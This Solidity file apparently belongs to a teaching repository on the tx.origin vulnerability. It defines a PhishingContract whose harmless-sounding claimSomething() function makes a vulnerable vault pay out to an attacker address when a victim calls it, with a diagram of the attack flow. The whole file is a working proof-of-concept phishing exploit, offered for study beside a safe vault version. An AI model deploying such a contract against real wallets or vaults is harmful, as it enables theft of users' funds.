// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { VulnerableVault } from "src/security/tx-origin/VulnerableVault.sol";
import { SafeVault } from "src/security/tx-origin/SafeVault.sol";

// Alice
//  │
//  │ tx
//  ▼
// PhishingContract
//  │
//  │ vault.withdraw(bob)
//  ▼
// VulnerableVault

contract PhishingContract {
    VulnerableVault public vault;

    address payable immutable attacker;

    constructor(address vault_, address payable attacker_) {
        vault = VulnerableVault(vault_);
        attacker = attacker_;
    }

    function claimSomething() external {
        vault.withdraw(attacker);
    }

    function updateVault(address vault_) external {
        require(msg.sender == attacker);
        vault = VulnerableVault(vault_);
    }
}
